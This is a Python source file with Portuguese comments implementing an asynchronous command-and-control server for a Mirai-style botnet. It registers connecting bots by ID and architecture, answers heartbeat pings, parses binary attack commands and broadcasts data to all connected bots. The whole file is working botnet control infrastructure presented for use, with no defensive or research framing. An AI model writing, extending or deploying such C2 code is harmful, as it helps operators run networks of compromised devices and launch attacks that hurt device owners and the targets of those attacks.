#!/usr/bin/env python3
"""
Servidor CNC assíncrono - gerencia conexões de bots
"""
import asyncio
import struct
import json
import time

# Importa do protocolo com path absoluto do projeto
from cnc.protocol import AttackCommand  # noqa


class MiraiServer:
    def __init__(self, host='0.0.0.0', port=7000, verbose=False):
        self.host = host
        self.port = port
        self.verbose = verbose
        self.bots = {}  # {uid: {ip, arch, status, writer}}
        self.loop = None
        self._server = None

    async def start(self):
        self.loop = asyncio.get_running_loop()
        self._server = await asyncio.start_server(
            self.handle_client,
            self.host,
            self.port
        )
        addr = self._server.sockets[0].getsockname()
        print(f"[+] CNC Server rodando em {addr[0]}:{addr[1]}")
        print(f"[+] Aguardando conexões de bots...")

        async with self._server:
            await self._server.serve_forever()

    async def handle_client(self, reader, writer):
        """Gerencia conexão de um bot"""
        addr = writer.get_extra_info('peername')
        if self.verbose:
            print(f"[*] Nova conexão de {addr}")

        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break

                # Processa pacote do protocolo Mirai
                await self.process_packet(data, writer, addr)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            if self.verbose:
                print(f"[!] Erro na conexão {addr}: {e}")
        finally:
            # Remove bot da lista
            uid = self._get_uid(writer)
            if uid and uid in self.bots:
                del self.bots[uid]
                if self.verbose:
                    print(f"[-] Bot {uid} desconectado. Total: {len(self.bots)}")
            writer.close()

    def _get_uid(self, writer):
        """Busca UID do bot pelo writer"""
        for uid, info in self.bots.items():
            if info.get('writer') == writer:
                return uid
        return None

    async def process_packet(self, data, writer, addr):
        """Processa pacotes do protocolo Mirai"""
        try:
            # Tenta interpretar como login/register
            text = data.decode('utf-8', errors='ignore').strip()

            if text.startswith('REGISTER:'):
                # Formato: REGISTER:uid:arch
                parts = text.split(':', 2)
                if len(parts) >= 2:
                    uid = parts[1]
                    arch = parts[2] if len(parts) > 2 else 'unknown'
                    self.bots[uid] = {
                        'ip': addr[0],
                        'arch': arch,
                        'status': 'online',
                        'writer': writer,
                        'connected_at': time.time()
                    }
                    print(f"[+] Bot registrado: {uid} ({arch}) - {addr}")
                    writer.write(b'OK\n')
                    await writer.drain()
                    return

            if text.startswith('PING'):
                writer.write(b'PONG\n')
                await writer.drain()
                return

            # Tenta interpretar como AttackCommand binário
            try:
                cmd = AttackCommand.from_bytes(data)
                if self.verbose:
                    print(f"[*] Comando recebido: {cmd}")
            except Exception:
                # Não é um comando válido, ignora
                pass

        except Exception as e:
            if self.verbose:
                print(f"[!] Erro processando pacote: {e}")

    async def broadcast(self, data):
        """Envia dados para todos os bots conectados"""
        if not self.bots:
            print("[!] Nenhum bot conectado para broadcast")
            return

        sent = 0
        for uid, info in list(self.bots.items()):
            writer = info.get('writer')
            if writer and not writer.is_closing():
                try:
                    writer.write(data)
                    await writer.drain()
                    sent += 1
                except Exception as e:
                    if self.verbose:
                        print(f"[!] Erro enviando para {uid}: {e}")
                    del self.bots[uid]

        print(f"[+] Broadcast enviado para {sent}/{len(self.bots)} bots")


async def run_server(host='0.0.0.0', port=7000, verbose=False):
    """Factory function para criar e iniciar o servidor"""
    server = MiraiServer(host, port, verbose)
    await server.start()
